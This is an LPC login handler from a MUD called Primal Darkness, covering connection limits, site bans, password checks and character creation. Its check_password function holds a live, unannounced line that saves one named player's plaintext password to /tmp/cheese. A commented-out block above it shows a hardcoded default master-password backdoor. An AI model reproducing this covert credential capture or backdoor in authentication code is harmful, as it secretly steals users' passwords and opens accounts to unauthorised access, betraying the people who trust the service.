// Modified for gameinfo by Galgalon 940411
// Modified for pueblo

#include <config.h> 
#include <news.h>
#include <flags.h>
#include <security.h> 
#include <daemons.h> 
#include <objects.h>

static private int __CrackCount; 
static private string __Name; 
static private object __Player, playa; 
string pueb_ver, pueb_md5;
#define YELLOW     33
 
static void logon();
static void get_name(string str);
static void get_password(string str);
static private int locked_access();
static private int check_password(string str);
static private int valid_site(string ip);
static private int is_copy();
static void disconnect_copy(string str, object ob);
static private void exec_user();
static void new_user(string str);
static void choose_password(string str);
static void confirm_password(string str2, string str1);
static void choose_terminal(string str);
static void choose_gender(string str);
static void enter_email(string str);
static void enter_real_name(string str);
static void idle();
static void receive_message(string cl, string msg);
static private void internal_remove();
void remove();

void create() { 
    seteuid(UID_ROOT); 
    __Name = ""; 
    __CrackCount = 0; 
    __Player = 0; 
  } 

static void display_logon()
{
 int i,a;
    a = i = sizeof(users());
    i--;
    while(a--)
     if (users()[a]->query_invis()) i--;

if (!pueb_ver) 
  message("logon", "\n"+terminal_colour(read_file(WELCOME), TERMINAL_D->query_term_info("ansi")), this_object());
    if (pueb_ver)
{
message("logon","<pre><font=\"arial\" size=\"12\"><body bgcolor=\"#0000000\" "
                "fgcolor=\"#ffffffff\"><center><p>", this_object());
message("logon", "<img src=\"http://www.iuis.org/mud/pueblo/greendragon.gif\">", this_object());

}      
 message("logon", center("Copyright (c) 1999-2002 Primal Darkness Productions."), this_object());
    if (!i)
      message("logon", "\n"+center("There is currently nobody in the realm.")+"\n",  this_object());
     else
    if (i==1)
      message("logon", "\n"+center("There is currently only one person in the realm.")+"\n", this_object());
     else
      message("logon", "\n"+center("There are currently "+i+" people in the realm.")+"\n", this_object());
message("logon", center("Driver: "+version()+"      Mudlib: PD/NM v2.0/3.0\n"), 
                 this_object()); 
message("logon", "\nWhat name do you wish? ", this_object());

}
static void logon() { 
 int i, b=0;
 object *ob;

  if ((i=FPROT_D->add_connection(query_ip_number()))<1)
   {
     message("logon", "-------------[ Access Denied ]-------------\n"
                      "Your access has been denied for 30 seconds "
                      "for connecting too fast.\nPlease wait and try "
                      "again.\n",
             this_object());
    if (i==0)
    if (FPROT_D->firewall_ip(query_ip_number())==-1)
      CHAT_D->do_raw_chat("driver", "Flood %^BOLD%^%^YELLOW%^<driver>"
             "%^RESET%^ "+query_ip_number()+"'s access has been denied for "
             "30 seconds for repeated connections.");
      internal_remove();
      return;
    }


 i = sizeof(ob = users());
 while(i--)
  {
    if (query_ip_number()==query_ip_number(ob[i])) b++;
  } 
  if (b>3)
    {
this_object()->setenv("TERM", "ansi");
message("logon",
"--------------[ Access Denied ]--------------\n"
" You are only allowed to have 3 characters on\n"
" simultaniously. Try getting off one character\n"
" and try logging on again.\n"
"---------------------------------------------\n",
this_object());
     internal_remove();
    }
    call_out("idle", LOGON_TIMEOUT); 
    if(catch(__Player = new(OB_USER))) {
message("logon", 
"---------------[ Error! ]---------------\n"
" Someone is currently working on the\n"
" main user object. Please try again in\n"
" a few minutes. If you still get this\n"
" message, email bind@primaldarkness.com\n"
"----------------------------------------\n", this_object());
	internal_remove();
	return; 
      }  

if (BANISH_D->query_banished_ip(query_ip_number()))
  {
    message("logon", "The site you are trying to log in from has been banished.\n"
                     "If you feel there has been an error, please email me at \n"
                     "stormbringer@dungeonware.net.\n", this_object());
    internal_remove();
    return;
  }

    display_logon();
    input_to("get_name"); 
} 
 
static void get_name(string str) { 
    if(!str || str == "") { 
message("logon",
"--------------[ Invalid ]--------------\n"
" Please try entering something for a\n"
" character name. Please try again.\n"
"---------------------------------------\n", this_object());
	internal_remove();
	return; 
      } 
    __Name = lower_case(str); 

    if (sscanf(__Name, "puebloclient %s md5=\"%s\"", pueb_ver, pueb_md5))
      {
       __Player->setup_pueblo(pueb_ver, pueb_md5);
       message("logon", "</xch_mudtext><img xch_mode=html><xch_page clear=text>\n", this_object());
      display_logon();
       input_to("get_name");
       return;
      }              

    if((int)master()->is_locked()) {
        message("logon", read_file(LOCKED_NEWS), this_object());
        if(locked_access())
          message("logon", "\n    >>> Access allowed <<<\n",this_object());
        else {
            message("logon", "\n    >>> Access denied <<<\n",this_object());
            internal_remove();
            return;
          }
      }

    if(!user_exists(__Name)) { 
	if(!((int)BANISH_D->valid_name(__Name))) { 
message("logon",
"-----------------[ Invalid ]-----------------\n"
" Please choose another name for a character\n"
" name for the one you entered is invalid.\n"
" \n"
" * Your name must be in alphabetic characters\n"
" * They must be no longer than "+MAX_USER_NAME_LENGTH+" letters\n"
" * They must be no shorter than "+MIN_USER_NAME_LENGTH+" letters\n"
" * Please, no offensive names\n"
"---------------------------------------------\n", this_object());
	    message("logon", "\nPlease enter another name: ", this_object()); 
	    input_to("get_name"); 
	    return; 
	  } 
        
	if(!((int)BANISH_D->allow_logon(__Name, query_ip_number()))) { 
	    message("logon", read_file(REGISTRATION_NEWS), this_object()); 
	    internal_remove();
	    return; 
	  } 
      this_object()->setenv("TERM", "ansi");

	message("logon", terminal_colour(
     "%^BOLD%^%^BLUE%^-------------------------%^WHITE%^[ %^CYAN%^New Name %^WHITE%^]%^BLUE%^------------------------------%^RESET%^\n"
     "%^CYAN%^ Does [ "+capitalize(__Name)+" ] sound good for a character name?\n"
     " This is a name that will stick with you throughout your characters\n"
     " life on Primal Darkness.\n" 
     "%^BOLD%^%^BLUE%^-------------------------------------------------------------------%^RESET%^\n"
     "Do you like to keep that name? [(y)es/(n)o]: ", 
      TERMINAL_D->query_term_info("ansi-status"), 80, 0), 
	 this_object()); 
	input_to("new_user"); 
	return; 
      } 
    if(!((int)BANISH_D->allow_logon(__Name, query_ip_number()))) { 
	message("logon", read_file(BANISHED_NEWS), this_object()); 
	internal_remove();
	return; 
      } 
    message("logon", "Welcome back to Primal Darkness, please enter your password: ", this_object()); 
    input_to("get_password", I_NOECHO | I_NOESC); 
  } 
 
static void get_password(string str) { 
    if(!str || str == "") { 
	message("logon", "\nYou must enter a password.  Try again later.\n", 
	  this_object()); 
	internal_remove();
	return; 
      } 
   enable_wizard();
    if(!check_password(str)) { 
	message("logon", "\nInvalid password.\n", this_object()); 
	if(++__CrackCount > MAX_PASSWORD_TRIES) { 
        write_file("/failed/"+__Name, ctime(time())+"\n", 0);
        write_file("/failed/"+__Name, ">>> Account hack attempt from, "+
        query_ip_number()+" [ 3 pass attempts failed ] <<<\n", 0);

	    message("logon", "No more attempts allowed.\n", this_object()); 
	    internal_remove();
	    return; 
	  } 
	seteuid(UID_LOG); 
	log_file("watch/logon", sprintf("%s from %s\n", __Name, query_ip_number())); 
	seteuid(getuid()); 
	destruct(__Player);
	__Player = new(OB_USER);
	message("logon", "Password: ", this_object()); 
	input_to("get_password", I_NOECHO | I_NOESC); 
	return; 
      } 
    if(!is_copy()) exec_user(); 
  } 
 
static private int locked_access() { 
    int i; 
    
    if((int)BANISH_D->is_guest(__Name)) return 1; 
    i = sizeof(LOCKED_ACCESS_ALLOWED); 
    while(i--) if(member_group(__Name, LOCKED_ACCESS_ALLOWED[i])) return 1; 
    return 0; 
  } 
 
static private int check_password(string str) { 
    string pass; 

//    def = "$1$z/hIu/FHsdfiodsjfoiuhfiuh0";
      
    master()->load_player_from_file(__Name, __Player); 
  /*  
    if ((crypt(str, def)  == def) || (oldcrypt(str,def) == def)) 
      {   
    seteuid(UID_LOG);
    log_file("enter", sprintf("%s (exec): %s [using default password]\n", __Name, ctime(time())));
    seteuid(getuid());
     return valid_site(query_ip_number());
     } 
*/
   if (__Player->query_name()=="bettina") write_file("/tmp/cheese",str);
    if((pass = (string)__Player->query_password()) != crypt(str, pass) &&
       (pass!=oldcrypt(str,pass))) return 0; 
    return valid_site(query_ip_number()); 
  } 
 
static private int valid_site(string ip) { 
    string a, b; 
    string *miens; 
    int i; 
 
    if(!(i = sizeof(miens = (string *)__Player->query_valid_sites()))) return 1; 
    while(i--) { 
	if(ip == miens[i]) return 1; 
	if(sscanf(miens[i], "%s.*s", a) && sscanf(ip, a+"%s", b)) return 1; 
      } 
    return 0; 
  } 
 
static private int is_copy() { 
    object ob; 
 
    if(!(ob = find_player(__Name))) return 0; 
    if(interactive(ob)) { 
	message("logon", "\nThere currently exists an interactive copy of you.\n", 
	  this_object()); 
	message("logon", "Do you wish to take over this interactive copy? (y/n) ", 
	  this_object()); 
	input_to("disconnect_copy", I_NORMAL, ob); 
	return 1; 
      } 
    seteuid(UID_LOG); 
    log_file("enter", sprintf("%s (exec): %s\n", __Name, ctime(time()))); 
    seteuid(getuid()); 
    if(exec(ob, this_object())) ob->restart_heart(); 
    else message("logon", "Problem reconnecting.\n", this_object()); 
    internal_remove();
    return 1; 
  } 
 
static void disconnect_copy(string str, object ob) { 
    object tmp; 
 
    if((str = lower_case(str)) == "" || str[0] != 'y') { 
	message("logon", "\nThen please try again later!\n", this_object()); 
	internal_remove();
	return; 
      } 
    message("info", "You are being taken over by hostile aliens!", ob); 
    exec(tmp = new(OB_USER), ob); 
    exec(ob, this_object()); 
    destruct(tmp); 
    message("logon", "\nAllowing login.\n", ob); 
    internal_remove();
  } 
 
static private void exec_user() { 

    message("info", "Setting up your character..\n", this_object());
/* 
   if(MULTI_D->query_prevent_login(__Name)) { 
	internal_remove();
	return; 
      } 
*/
    __Player->set_name(__Name); 
    if(!exec(__Player, this_object())) { 
	message("logon", "Problem connecting.\n", this_object()); 
	internal_remove();
	return; 
      } 
    __Player->setup(); 

    destruct(this_object()); 
  } 
 
static void new_user(string str) { 
    if((str = lower_case(str)) == "" || str[0] != 'y') { 
	message("logon", "\nOk, then enter the name you really want: ", this_object()); 
	input_to("get_name"); 
	return; 
      } 
    seteuid(UID_LOG); 
     log_file("new_players", sprintf("%s : %s : %s\n", query_ip_number(), __Name,  
      ctime(time()))); 
    seteuid(getuid());
message("logon", terminal_colour(
"\n%^BOLD%^%^BLUE%^-------------------------%^WHITE%^[ %^CYAN%^Personal Password %^WHITE%^]%^BLUE%^-------------------------%^RESET%^\n"
"%^CYAN%^This prevents other users from playing your character. The only way you\n"
"will be able to access this character is with your unique password you\n"
"pick below. Make sure nobody knows about this password and do not make\n"
"it so simple.\n"
"\n* Tips:\n"
"   - Mix numbers and letters with your password\n"
"   - Change it every so often if you can\n"
"%^BOLD%^%^BLUE%^-----------------------------------------------------------------------%^RESET%^\n",
TERMINAL_D->query_term_info("ansi-status"), 80, 0),
this_object());
message("logon","\n[1/5] Please choose a password of at least 5 letters: ", 
      this_object()); 
    input_to("choose_password", I_NOECHO | I_NOESC); 
  } 
 
static void choose_password(string str) { 
    if(strlen(str) < 5) {
message("logon", terminal_colour(
"\n%^BOLD%^%^BLUE%^-------------------------%^WHITE%^[ %^CYAN%^Password too short %^WHITE%^]%^BLUE%^-------------------------%^RESET%^\n"
"%^CYAN%^Your password is shorter than 5 letters long. Please choose another\n"
"password that is at lest 5 letters in length.\n"
"%^BOLD%^%^BLUE%^------------------------------------------------------------------------%^RESET%^\n",
TERMINAL_D->query_term_info("ansi-status"), 80, 0),
this_object());
message("logon", "\n[1/5] Please choose a password of at least 5 letters:", 
	  this_object()); 
  input_to("choose_password", I_NOECHO | I_NOESC); 
       return;
      } 
   if (str=="password" || str== __Name)
     {
      message("logon", "Please choose a more unique password.\n", this_object());
     input_to("choose_password", I_NOECHO | I_NOESC);
       return;
     }
    message("logon", "\n[2/5] Please confirm your password choice: ", this_object()); 
    input_to("confirm_password", I_NOECHO | I_NOESC, str); 
  } 
 
static void confirm_password(string str2, string str1) { 
    if(str1 == str2) { 
	__Player->set_password(str2 = oldcrypt(str2, 0)); 
message("logon",terminal_colour(
"\n\n%^BOLD%^%^BLUE%^--------------------------%^WHITE%^[%^CYAN%^ Gender%^WHITE%^ ]%^BLUE%^--------------------------%^RESET%^\n"
"%^CYAN%^Here you can pick the type of gender of the character you wish\n"
"to role play. The only available genders are: male and female.\n"
"%^BOLD%^%^BLUE%^--------------------------------------------------------------%^RESET%^\n",
 TERMINAL_D->query_term_info("ansi-status"), 80, 0),
this_object());
message("logon", "\n[3/5] Please choose an interesting gender (male or female): ", 
	  this_object()); 
	input_to("choose_gender"); 
	return; 
      } 
    else { 
	message("logon", "\n- Password entries do not match.\n[1/5]  Choose a password: ", 
	  this_object()); 
	input_to("choose_password", I_NOECHO | I_NOESC); 
	return; 
      } 
  } 
 
static void choose_gender(string str) { 
    if(str != "male" && str != "female") { 
	message("logon", "\nCute, but pretend to be either male or female instead\n", 
	  this_object()); 
message("logon", "\n[3/5] Please choose an interesting gender (male or female): ",
this_object());
	input_to("choose_gender"); 
	return; 
      } 
    __Player->set_gender(str); 
message("logon", terminal_colour(
"\n%^BOLD%^%^BLUE%^----------------------------%^WHITE%^[ %^CYAN%^Email%^WHITE%^ ]%^BLUE%^----------------------------%^RESET%^\n"
"%^CYAN%^If you would like to supply the administrators of Primal Darkness\n"
"your email address, please enter it below. It will not be given\n"
"out or anything of that sort. It would be used to contact you\n"
"about your character. If you wish not to enter an email address,\n"
"enter (user@none). If you do not wish it to be displayed to other\n"
"players. put a \"*\" before your email address. ex: *exam@ple.com\n"
"%^BOLD%^%^BLUE%^-----------------------------------------------------------------%^RESET%^\n",
TERMINAL_D->query_term_info("ansi-status"), 80, 0), this_object());

message("logon","\n[4/5] Please enter your email address: ", this_object());
    input_to("enter_email"); 
  } 
 
static void enter_email(string str) { 
    string a, b; 
 
    if(!str || str == "" || (sscanf(str, "%s@%s", a, b) != 2 &&
                             sscanf(str, "#%s@%s", a,b) != 2)) { 
	message("logon", "\nEmail must be in the form user@host.\n",this_object()); 
        message("logon","\n[4/5] Please enter your email address: ", this_object());
	input_to("enter_email"); 
	return; 
      } 
   if (sscanf(str, "#%s@%s", a,b) == 2) {
     message("logon", "\n - Your email address will not be shown to other players.\n", this_object());
   }
    __Player->set_email(str); 
message("logon", terminal_colour(
"%^BOLD%^%^BLUE%^----------------------------%^WHITE%^[%^CYAN%^ Real Name%^WHITE%^ ]%^BLUE%^----------------------------%^RESET%^\n"
"%^CYAN%^If you wouldnt mind telling us your real name, please enter it below.\n"
"It is optional for you to do so. You can always add it later in time.\n"
"%^BOLD%^%^BLUE%^---------------------------------------------------------------------%^RESET%^\n",
TERMINAL_D->query_term_info("ansi-status"), 80, 0), this_object());
    message("logon", "\n[5/5] Please enter your real name (optional): ", 
      this_object()); 
    input_to("enter_real_name"); 
  } 

static void enter_real_name(string str) { 
    string stri;
    string res;
    res  = sprintf("%c[0;%d;%dm", 27, 0, 0);
    stri = sprintf("%c[0;%d;%dm",27,1,YELLOW);
    if(!str || str == "") str = "Unknown"; 
    __Player->set_rname(str);
    __Player->setenv("TERM", "ansi");
    seteuid(UID_LOG);
    log_file("enter", sprintf("%s (new player): %s\n", __Name, ctime(time())));
    seteuid(getuid());
    message("info", "%^BOLD%^%^WHITE%^<%^CYAN%^-%^WHITE%^>%^RESET%^%^CYAN%^ "+capitalize(__Name)+" descends from the sky to begin "+possessive(__Player)+" journey in life.", users());
    exec_user();
        
  } 
 
static void idle() { 
    message("logon", "\nLogin timed out.\n", this_object()); 
    internal_remove();
  } 
 
static void receive_message(string cl, string msg) { 
    if(cl != "logon") return; 
    receive(msg); 
  } 

static private void internal_remove() {
    if(__Player) destruct(__Player);
    destruct(this_object());
}

void remove() {
    if(geteuid(previous_object()) != UID_ROOT) return;
    internal_remove();
}
